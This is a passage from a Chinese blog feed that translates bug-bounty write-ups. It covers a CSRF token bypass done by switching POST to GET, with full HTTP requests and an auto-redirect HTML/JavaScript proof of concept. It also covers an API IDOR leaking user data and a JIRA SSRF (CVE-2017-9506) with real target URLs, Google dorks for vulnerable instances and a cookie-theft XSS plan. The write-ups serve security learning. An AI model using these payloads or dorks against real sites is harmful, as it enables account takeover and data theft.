<video id="video" controls preload="none" poster="http://img5.imgtn.bdimg.com/it/u=750248180,3726006403&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_8/xss-2.mp4"><br></video>



<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：The-story-behined-the-Strong-XSS-filter-bypass&quot;&gt;&lt;a href=&quot;#原文：The-story-behined-the-Strong-XSS-filter-bypass&quot; class=&quot;headerlink&quot; title=&quot;原文：The story behined the Strong XSS filter bypass!&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/@Skylinearafat/the-story-behined-the-namecheap-xss-filter-bypass-be79624fd0c3&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;The story behined the Strong XSS filter bypass!&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：编码绕过XSS防火墙&quot;&gt;&lt;a href=&quot;#漏洞：编码绕过XSS防火墙&quot; class=&quot;headerlink&quot; title=&quot;漏洞：编码绕过XSS防火墙&quot;&gt;&lt;/a&gt;漏洞：编码绕过XSS防火墙&lt;/h4&gt;&lt;h4 id=&quot;作者：Yeasir-Arafat&quot;&gt;&lt;a href=&quot;#作者：Yeasir-Arafat&quot; class=&quot;headerlink&quot; title=&quot;作者：Yeasir Arafat&quot;&gt;&lt;/a&gt;作者：&lt;a href=&quot;https://medium.com/@Skylinearafat?source=post_header_lockup&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Yeasir Arafat&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;难度：中&quot;&gt;&lt;a href=&quot;#难度：中&quot; class=&quot;headerlink&quot; title=&quot;难度：中&quot;&gt;&lt;/a&gt;难度：中&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第七篇翻译：bypass CSRF</title>
    <link href="http://TimeS0ng.github.io/2018/12/23/%E7%AC%AC%E4%B8%83%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9Abypass-CSRF/"/>
    <id>http://TimeS0ng.github.io/2018/12/23/第七篇翻译：bypass-CSRF/</id>
    <published>2018-12-23T06:54:36.000Z</published>
    <updated>2019-01-25T01:06:57.606Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：A-very-useful-technique-to-bypass-the-CSRF-protection-for-fun-and-profit"><a href="#原文：A-very-useful-technique-to-bypass-the-CSRF-protection-for-fun-and-profit" class="headerlink" title="原文：A very useful technique to bypass the CSRF protection for fun and profit."></a>原文：<a href="https://medium.com/@Skylinearafat/a-very-useful-technique-to-bypass-the-csrf-protection-for-fun-and-profit-471af64da276" target="_blank" rel="external">A very useful technique to bypass the CSRF protection for fun and profit.</a></h4><h4 id="漏洞：利用GET代替POST，绕过CSRF防护"><a href="#漏洞：利用GET代替POST，绕过CSRF防护" class="headerlink" title="漏洞：利用GET代替POST，绕过CSRF防护"></a>漏洞：利用GET代替POST，绕过CSRF防护</h4><h4 id="作者：Yeasir-Arafat"><a href="#作者：Yeasir-Arafat" class="headerlink" title="作者：Yeasir Arafat"></a>作者：<a href="https://medium.com/@Skylinearafat?source=post_header_lockup" target="_blank" rel="external">Yeasir Arafat</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h4 id="emsp-emsp-嗨，伙计们！与你们分享一些好的东西总是很愉快的。从文章的标题就可以猜到今天我将分享一些关于绕过CSRF防护的技术。"><a href="#emsp-emsp-嗨，伙计们！与你们分享一些好的东西总是很愉快的。从文章的标题就可以猜到今天我将分享一些关于绕过CSRF防护的技术。" class="headerlink" title="&emsp;&emsp;嗨，伙计们！与你们分享一些好的东西总是很愉快的。从文章的标题就可以猜到今天我将分享一些关于绕过CSRF防护的技术。"></a>&emsp;&emsp;嗨，伙计们！与你们分享一些好的东西总是很愉快的。从文章的标题就可以猜到今天我将分享一些关于绕过CSRF防护的技术。</h4><h2 id="什么是CSRF保护？"><a href="#什么是CSRF保护？" class="headerlink" title="什么是CSRF保护？"></a>什么是CSRF保护？</h2><h4 id="emsp-emsp-简而言之，CSRF（跨站请求伪造）攻击是一种专门针对WEB站点状态更改请求的攻击。为了防止这种攻击，开发人员以多种方式在request请求中添加了ANTI-CSRF-token令牌。如果你想了解详细的原理可以看看这两篇文章-“Article-1“，”Article-2“"><a href="#emsp-emsp-简而言之，CSRF（跨站请求伪造）攻击是一种专门针对WEB站点状态更改请求的攻击。为了防止这种攻击，开发人员以多种方式在request请求中添加了ANTI-CSRF-token令牌。如果你想了解详细的原理可以看看这两篇文章-“Article-1“，”Article-2“" class="headerlink" title="&emsp;&emsp;简而言之，CSRF（跨站请求伪造）攻击是一种专门针对WEB站点状态更改请求的攻击。为了防止这种攻击，开发人员以多种方式在request请求中添加了ANTI-CSRF token令牌。如果你想了解详细的原理可以看看这两篇文章 “Article-1“，”Article-2“"></a>&emsp;&emsp;简而言之，CSRF（跨站请求伪造）攻击是一种专门针对WEB站点状态更改请求的攻击。为了防止这种攻击，开发人员以多种方式在request请求中添加了ANTI-CSRF token令牌。如果你想了解详细的原理可以看看这两篇文章 “<a href="https://www.acunetix.com/websitesecurity/csrf-attacks/" target="_blank" rel="external">Article-1</a>“，”<a href="https://laravel.com/docs/5.7/csrf" target="_blank" rel="external">Article-2</a>“</h4><h4 id="emsp-emsp-现在我们假设站点域名为vulnhost-com，该站点根据一个POST请求提供的数据验证我们的请求。vulnhost-com实际上是先将-csrf-token标记到POST请求中，然后再在服务器端验证-csrf-token"><a href="#emsp-emsp-现在我们假设站点域名为vulnhost-com，该站点根据一个POST请求提供的数据验证我们的请求。vulnhost-com实际上是先将-csrf-token标记到POST请求中，然后再在服务器端验证-csrf-token" class="headerlink" title="&emsp;&emsp;现在我们假设站点域名为vulnhost.com，该站点根据一个POST请求提供的数据验证我们的请求。vulnhost.com实际上是先将_csrf token标记到POST请求中，然后再在服务器端验证_csrf token"></a>&emsp;&emsp;现在我们假设站点域名为vulnhost.com，该站点根据一个POST请求提供的数据验证我们的请求。vulnhost.com实际上是先将_csrf token标记到POST请求中，然后再在服务器端验证_csrf token</h4><p>[*]状态更改请求看起来像是下面这样的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">POST /mycenter/settings/account.html?2-1.IBehaviorListener.0-formContact-saveContact HTTP/1.1</div><div class="line">Host: en.vulnhost.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</div><div class="line">Accept: application/xml, text/xml, */*; q=0.01</div><div class="line">Accept-Language: en-US,en;q=0.5</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: https://en.vulnhost.com/mycenter/settings/account.html</div><div class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</div><div class="line">Wicket-Ajax: true</div><div class="line">Migration-Wicket: 6</div><div class="line">Wicket-Ajax-BaseURL: mycenter/settings/account.html</div><div class="line">Wicket-FocusedElementId: id49</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">Content-Length: 246</div><div class="line">Cookie: .......</div><div class="line">Connection: close</div><div class="line">																.</div><div class="line">_csrf=725a7f90-192f-4b94-8fc9-6320ace14fef&amp;id48_hf_0=&amp;gender=radio8&amp;firstName=xx&amp;lastName=YY&amp;saveContact=1</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-这里，-csrf-…-用来生成随机令牌，并提交给服务端进行验证。如果我利用GET方法发送请求，并将-csrf令牌删除，那么服务端将不会对其进行验证"><a href="#emsp-emsp-这里，-csrf-…-用来生成随机令牌，并提交给服务端进行验证。如果我利用GET方法发送请求，并将-csrf令牌删除，那么服务端将不会对其进行验证" class="headerlink" title="&emsp;&emsp;这里，_csrf=…. 用来生成随机令牌，并提交给服务端进行验证。如果我利用GET方法发送请求，并将_csrf令牌删除，那么服务端将不会对其进行验证"></a>&emsp;&emsp;这里，_csrf=…. 用来生成随机令牌，并提交给服务端进行验证。如果我利用GET方法发送请求，并将_csrf令牌删除，那么服务端将不会对其进行验证</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">GET /mycenter/settings/account.html?2-1.IBehaviorListener.0-formContact-saveContact=&amp;id48_hf_0=&amp;gender=radio8&amp;firstName=XX&amp;lastName=YY&amp;saveContact=1 HTTP/1.1</div><div class="line">Host: en.vulnhost.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</div><div class="line">Accept: application/xml, text/xml, */*; q=0.01</div><div class="line">Accept-Language: en-US,en;q=0.5</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: https://en.vulnhost.com/mycenter/settings/account.html</div><div class="line">Wicket-Ajax: true</div><div class="line">Migration-Wicket: 6</div><div class="line">Wicket-Ajax-BaseURL: mycenter/settings/account.html</div><div class="line">Wicket-FocusedElementId: id49</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">Cookie: ...</div><div class="line">Connection: close</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-正如期待的那样，服务端响应200-OK，但是使用典型的HTML-POC来更改请求时会出现一些问题。以前我也遇到过，之所以会这样，是因为在这种情况下浏览器需要刷新之后才能渲染请求到的内容。我猜想GET请求包含了一堆HTTP-header，这可能会中断更改请求"><a href="#emsp-emsp-正如期待的那样，服务端响应200-OK，但是使用典型的HTML-POC来更改请求时会出现一些问题。以前我也遇到过，之所以会这样，是因为在这种情况下浏览器需要刷新之后才能渲染请求到的内容。我猜想GET请求包含了一堆HTTP-header，这可能会中断更改请求" class="headerlink" title="&emsp;&emsp;正如期待的那样，服务端响应200 OK，但是使用典型的HTML POC来更改请求时会出现一些问题。以前我也遇到过，之所以会这样，是因为在这种情况下浏览器需要刷新之后才能渲染请求到的内容。我猜想GET请求包含了一堆HTTP header，这可能会中断更改请求"></a>&emsp;&emsp;正如期待的那样，服务端响应200 OK，但是使用典型的HTML POC来更改请求时会出现一些问题。以前我也遇到过，之所以会这样，是因为在这种情况下浏览器需要刷新之后才能渲染请求到的内容。我猜想GET请求包含了一堆HTTP header，这可能会中断更改请求</h4><h4 id="emsp-emsp-为了解决这个问题，我结合了javascript和HTML来构造POC"><a href="#emsp-emsp-为了解决这个问题，我结合了javascript和HTML来构造POC" class="headerlink" title="&emsp;&emsp;为了解决这个问题，我结合了javascript和HTML来构造POC"></a>&emsp;&emsp;为了解决这个问题，我结合了javascript和HTML来构造POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">	var timer = null;</div><div class="line">function auto_reload()</div><div class="line">&#123;</div><div class="line">	window.location = &apos;https://en.vulnhost.com/mycenter/settings/account.html?4-2.IBehaviorListener.0-formContact-saveContact=&amp;id48_hf_0=&amp;gender=radio8&amp;firstName=Account&amp;lastName=Takeover&amp;saveContact=1&apos;;</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;!-- Reload page every 5 seconds. --&gt;</div><div class="line">	 &lt;body onload=&quot;timer = setTimeout(&apos;auto_reload()&apos;,5000);&quot;&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-这样只要victim访问了我定制的网页，受害者就会被重定向到CSRF页面，并自动更改受害者的账号信息！"><a href="#emsp-emsp-这样只要victim访问了我定制的网页，受害者就会被重定向到CSRF页面，并自动更改受害者的账号信息！" class="headerlink" title="&emsp;&emsp;这样只要victim访问了我定制的网页，受害者就会被重定向到CSRF页面，并自动更改受害者的账号信息！"></a>&emsp;&emsp;这样只要victim访问了我定制的网页，受害者就会被重定向到CSRF页面，并自动更改受害者的账号信息！</h4><h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：A-very-useful-technique-to-bypass-the-CSRF-protection-for-fun-and-profit&quot;&gt;&lt;a href=&quot;#原文：A-very-useful-technique-to-bypass-the-CSRF-protection-for-fun-and-profit&quot; class=&quot;headerlink&quot; title=&quot;原文：A very useful technique to bypass the CSRF protection for fun and profit.&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/@Skylinearafat/a-very-useful-technique-to-bypass-the-csrf-protection-for-fun-and-profit-471af64da276&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;A very useful technique to bypass the CSRF protection for fun and profit.&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：利用GET代替POST，绕过CSRF防护&quot;&gt;&lt;a href=&quot;#漏洞：利用GET代替POST，绕过CSRF防护&quot; class=&quot;headerlink&quot; title=&quot;漏洞：利用GET代替POST，绕过CSRF防护&quot;&gt;&lt;/a&gt;漏洞：利用GET代替POST，绕过CSRF防护&lt;/h4&gt;&lt;h4 id=&quot;作者：Yeasir-Arafat&quot;&gt;&lt;a href=&quot;#作者：Yeasir-Arafat&quot; class=&quot;headerlink&quot; title=&quot;作者：Yeasir Arafat&quot;&gt;&lt;/a&gt;作者：&lt;a href=&quot;https://medium.com/@Skylinearafat?source=post_header_lockup&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Yeasir Arafat&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;难度：低&quot;&gt;&lt;a href=&quot;#难度：低&quot; class=&quot;headerlink&quot; title=&quot;难度：低&quot;&gt;&lt;/a&gt;难度：低&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第六篇翻译：信息泄露</title>
    <link href="http://TimeS0ng.github.io/2018/12/23/%E7%AC%AC%E5%85%AD%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <id>http://TimeS0ng.github.io/2018/12/23/第六篇翻译：信息泄露/</id>
    <published>2018-12-23T04:37:31.000Z</published>
    <updated>2019-01-25T01:07:03.726Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：How-Misconfigured-API-leaked-user-private-information"><a href="#原文：How-Misconfigured-API-leaked-user-private-information" class="headerlink" title="原文：How Misconfigured API leaked user private information?"></a>原文：<a href="https://medium.com/@Skylinearafat/how-misconfigured-api-leaked-user-private-information-e3e8c13e52e4" target="_blank" rel="external">How Misconfigured API leaked user private information?</a></h4><h4 id="漏洞：API接口配置不当导致信息泄露"><a href="#漏洞：API接口配置不当导致信息泄露" class="headerlink" title="漏洞：API接口配置不当导致信息泄露"></a>漏洞：API接口配置不当导致信息泄露</h4><h4 id="作者：Yeasir-Arafat"><a href="#作者：Yeasir-Arafat" class="headerlink" title="作者：Yeasir Arafat"></a>作者：<a href="https://medium.com/@Skylinearafat?source=user_popover" target="_blank" rel="external">Yeasir Arafat</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h4 id="emsp-emsp-接下来我将分享最近在私有BUG赏金平台上发现的API接口漏洞，这些漏洞真的特别有意思！"><a href="#emsp-emsp-接下来我将分享最近在私有BUG赏金平台上发现的API接口漏洞，这些漏洞真的特别有意思！" class="headerlink" title="&emsp;&emsp;接下来我将分享最近在私有BUG赏金平台上发现的API接口漏洞，这些漏洞真的特别有意思！"></a>&emsp;&emsp;接下来我将分享最近在私有BUG赏金平台上发现的API接口漏洞，这些漏洞真的特别有意思！</h4><h4 id="emsp-emsp-首先咱们假设漏洞站点的域名是redact-io-，该站点使用API从服务器上获取用户的数据，例如：http-api-redact-io"><a href="#emsp-emsp-首先咱们假设漏洞站点的域名是redact-io-，该站点使用API从服务器上获取用户的数据，例如：http-api-redact-io" class="headerlink" title="&emsp;&emsp;首先咱们假设漏洞站点的域名是redact.io ，该站点使用API从服务器上获取用户的数据，例如：http://api.redact.io"></a>&emsp;&emsp;首先咱们假设漏洞站点的域名是redact.io ，该站点使用API从服务器上获取用户的数据，例如：<a href="http://api.redact.io" target="_blank" rel="external">http://api.redact.io</a></h4><h4 id="emsp-emsp-在开始渗透之前，我通常会先去了解该站点的API的工作原理，我在http-docs-redact-io-上面阅读了完整的相关文档。了解你的目标网站的工作方式是非常重要的，知己知彼百战不殆，当你收集到足够多的信息之后，就能很轻松的制定攻击步骤！"><a href="#emsp-emsp-在开始渗透之前，我通常会先去了解该站点的API的工作原理，我在http-docs-redact-io-上面阅读了完整的相关文档。了解你的目标网站的工作方式是非常重要的，知己知彼百战不殆，当你收集到足够多的信息之后，就能很轻松的制定攻击步骤！" class="headerlink" title="&emsp;&emsp;在开始渗透之前，我通常会先去了解该站点的API的工作原理，我在http://docs.redact.io 上面阅读了完整的相关文档。了解你的目标网站的工作方式是非常重要的，知己知彼百战不殆，当你收集到足够多的信息之后，就能很轻松的制定攻击步骤！"></a>&emsp;&emsp;在开始渗透之前，我通常会先去了解该站点的API的工作原理，我在<a href="http://docs.redact.io" target="_blank" rel="external">http://docs.redact.io</a> 上面阅读了完整的相关文档。了解你的目标网站的工作方式是非常重要的，知己知彼百战不殆，当你收集到足够多的信息之后，就能很轻松的制定攻击步骤！</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_6/1.jpg" alt=""></p>
<h4 id="emsp-emsp-我发现目标域redact-io-正在使用https-api-redact-io-service-lt-userID-gt-来获取用户数据，这里的userID是该站点用户的唯一用户ID"><a href="#emsp-emsp-我发现目标域redact-io-正在使用https-api-redact-io-service-lt-userID-gt-来获取用户数据，这里的userID是该站点用户的唯一用户ID" class="headerlink" title="&emsp;&emsp;我发现目标域redact.io 正在使用https://api.redact.io/service/&lt; userID&gt; 来获取用户数据，这里的userID是该站点用户的唯一用户ID"></a>&emsp;&emsp;我发现目标域redact.io 正在使用<a href="https://api.redact.io/service/" target="_blank" rel="external">https://api.redact.io/service/</a>&lt; userID&gt; 来获取用户数据，这里的userID是该站点用户的唯一用户ID</h4><h4 id="emsp-emsp-所以我尝试去修改这里的userID，看看在未授权的情况下能否从这里提取数据，但是网站只是返回一个404错误给我"><a href="#emsp-emsp-所以我尝试去修改这里的userID，看看在未授权的情况下能否从这里提取数据，但是网站只是返回一个404错误给我" class="headerlink" title="&emsp;&emsp;所以我尝试去修改这里的userID，看看在未授权的情况下能否从这里提取数据，但是网站只是返回一个404错误给我"></a>&emsp;&emsp;所以我尝试去修改这里的userID，看看在未授权的情况下能否从这里提取数据，但是网站只是返回一个404错误给我</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://api.redact.io/service/05c0dc81753821cbdf9ab1cd5e366d21</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_6/2.jpg" alt=""></p>
<h4 id="emsp-emsp-呃？那接下来该咋整？看来该网站的API接口工作正常不像有漏洞啊。但从我过去的经验来看，我总结了一些针对API接口的小技巧，我们可以尝试利用其它参数来替代userID，例如：Email，userName，scope等"><a href="#emsp-emsp-呃？那接下来该咋整？看来该网站的API接口工作正常不像有漏洞啊。但从我过去的经验来看，我总结了一些针对API接口的小技巧，我们可以尝试利用其它参数来替代userID，例如：Email，userName，scope等" class="headerlink" title="&emsp;&emsp;呃？那接下来该咋整？看来该网站的API接口工作正常不像有漏洞啊。但从我过去的经验来看，我总结了一些针对API接口的小技巧，我们可以尝试利用其它参数来替代userID，例如：Email，userName，scope等"></a>&emsp;&emsp;呃？那接下来该咋整？看来该网站的API接口工作正常不像有漏洞啊。但从我过去的经验来看，我总结了一些针对API接口的小技巧，我们可以尝试利用其它参数来替代userID，例如：Email，userName，scope等</h4><h4 id="emsp-emsp-下面我使用userName来替换userID，可以看到越权成功，并且成功获取到其它用户的数据"><a href="#emsp-emsp-下面我使用userName来替换userID，可以看到越权成功，并且成功获取到其它用户的数据" class="headerlink" title="&emsp;&emsp;下面我使用userName来替换userID，可以看到越权成功，并且成功获取到其它用户的数据"></a>&emsp;&emsp;下面我使用userName来替换userID，可以看到越权成功，并且成功获取到其它用户的数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://api.redact.io/service/bugtester</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_6/3.jpg" alt=""></p>
<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：How-Misconfigured-API-leaked-user-private-information&quot;&gt;&lt;a href=&quot;#原文：How-Misconfigured-API-leaked-user-private-information&quot; class=&quot;headerlink&quot; title=&quot;原文：How Misconfigured API leaked user private information?&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/@Skylinearafat/how-misconfigured-api-leaked-user-private-information-e3e8c13e52e4&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;How Misconfigured API leaked user private information?&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：API接口配置不当导致信息泄露&quot;&gt;&lt;a href=&quot;#漏洞：API接口配置不当导致信息泄露&quot; class=&quot;headerlink&quot; title=&quot;漏洞：API接口配置不当导致信息泄露&quot;&gt;&lt;/a&gt;漏洞：API接口配置不当导致信息泄露&lt;/h4&gt;&lt;h4 id=&quot;作者：Yeasir-Arafat&quot;&gt;&lt;a href=&quot;#作者：Yeasir-Arafat&quot; class=&quot;headerlink&quot; title=&quot;作者：Yeasir Arafat&quot;&gt;&lt;/a&gt;作者：&lt;a href=&quot;https://medium.com/@Skylinearafat?source=user_popover&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Yeasir Arafat&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;难度：低&quot;&gt;&lt;a href=&quot;#难度：低&quot; class=&quot;headerlink&quot; title=&quot;难度：低&quot;&gt;&lt;/a&gt;难度：低&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第五篇翻译：SSRF to XSS</title>
    <link href="http://TimeS0ng.github.io/2018/12/23/%E7%AC%AC%E4%BA%94%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9ASSRF-to-XSS/"/>
    <id>http://TimeS0ng.github.io/2018/12/23/第五篇翻译：SSRF-to-XSS/</id>
    <published>2018-12-23T03:53:31.000Z</published>
    <updated>2019-01-25T01:08:45.101Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：How-Outdated-JIRA-Instances-suffers-from-multiple-security-vulnerabilities"><a href="#原文：How-Outdated-JIRA-Instances-suffers-from-multiple-security-vulnerabilities" class="headerlink" title="原文：How Outdated JIRA Instances suffers from multiple security vulnerabilities?"></a>原文：<a href="https://medium.com/@Skylinearafat/how-outdated-jira-instances-suffers-from-multiple-security-vulnerabilities-6a88c45e9ec6" target="_blank" rel="external">How Outdated JIRA Instances suffers from multiple security vulnerabilities?</a></h4><h4 id="漏洞：SSRF-XSS"><a href="#漏洞：SSRF-XSS" class="headerlink" title="漏洞：SSRF + XSS"></a>漏洞：SSRF + XSS</h4><h4 id="作者：Yeasir-Arafat"><a href="#作者：Yeasir-Arafat" class="headerlink" title="作者：Yeasir Arafat"></a>作者：Yeasir Arafat</h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h4 id="emsp-emsp-我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意"><a href="#emsp-emsp-我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意" class="headerlink" title="&emsp;&emsp;我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意"></a>&emsp;&emsp;我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://jira.brown.edu/plugins/servlet/oauth/users/icon-uri?consumerUri=http://www.baidu.com</div></pre></td></tr></table></figure>
<h4 id="如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法"><a href="#如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法" class="headerlink" title="如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法"></a>如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">inurl:visma intitle:JIRA login</div><div class="line">inurl:companyname intitle:JIRA login</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_5/1.png" alt=""></p>
<h4 id="emsp-emsp-我注意到域名https-customer-incident-consulting-visma-com-具有JIRA-6-3-1版本。我记得CVE-2017-9506-影响范围是Jira-versions-lt-7-3-5，所以我尝试验证一下该网站是否具有SSRF漏洞"><a href="#emsp-emsp-我注意到域名https-customer-incident-consulting-visma-com-具有JIRA-6-3-1版本。我记得CVE-2017-9506-影响范围是Jira-versions-lt-7-3-5，所以我尝试验证一下该网站是否具有SSRF漏洞" class="headerlink" title="&emsp;&emsp;我注意到域名https://customer-incident.consulting.visma.com 具有JIRA 6.3.1版本。我记得CVE-2017-9506 影响范围是Jira versions &lt; 7.3.5，所以我尝试验证一下该网站是否具有SSRF漏洞"></a>&emsp;&emsp;我注意到域名<a href="https://customer-incident.consulting.visma.com" target="_blank" rel="external">https://customer-incident.consulting.visma.com</a> 具有JIRA 6.3.1版本。我记得CVE-2017-9506 影响范围是Jira versions &lt; 7.3.5，所以我尝试验证一下该网站是否具有SSRF漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://customer-incident.consulting.visma.com/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.baidu.com</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_5/2.png" alt=""></p>
<h4 id="emsp-emsp-我尝试获取一些网站内部数据或获取读取权限，但是我失败了。-如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具Jira-Scan"><a href="#emsp-emsp-我尝试获取一些网站内部数据或获取读取权限，但是我失败了。-如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具Jira-Scan" class="headerlink" title="&emsp;&emsp;我尝试获取一些网站内部数据或获取读取权限，但是我失败了。 如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具Jira-Scan"></a>&emsp;&emsp;我尝试获取一些网站内部数据或获取读取权限，但是我失败了。 如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具<a href="https://github.com/random-robbie/Jira-Scan" target="_blank" rel="external">Jira-Scan</a></h4><h4 id="emsp-emsp-另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到https-customer-incident-consulting-visma-com-网站的用户cookie，而不是百度的cookie"><a href="#emsp-emsp-另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到https-customer-incident-consulting-visma-com-网站的用户cookie，而不是百度的cookie" class="headerlink" title="&emsp;&emsp;另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到https://customer-incident.consulting.visma.com 网站的用户cookie，而不是百度的cookie"></a>&emsp;&emsp;另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到<a href="https://customer-incident.consulting.visma.com" target="_blank" rel="external">https://customer-incident.consulting.visma.com</a> 网站的用户cookie，而不是百度的cookie</h4><p>[*]攻击者创建的evil.html</p>
